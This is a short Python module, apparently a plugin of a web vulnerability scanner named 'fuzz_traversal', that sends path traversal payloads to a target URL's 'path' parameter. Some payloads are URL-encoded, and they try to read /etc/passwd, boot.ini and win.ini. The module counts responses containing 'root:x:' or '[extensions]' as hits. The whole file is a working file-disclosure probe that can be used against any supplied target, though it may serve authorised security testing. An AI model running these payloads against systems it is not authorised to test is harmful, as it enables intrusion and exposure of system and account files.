import requests

def run(target):
    payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\boot.ini",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?path={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if "root:x:" in r.text or "[extensions]" in r.text:
                hits += 1
            if payload in r.text:
                reflections += 1
        except:
            continue

    return {
        "module": "fuzz_traversal",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Path traversal test"
    }
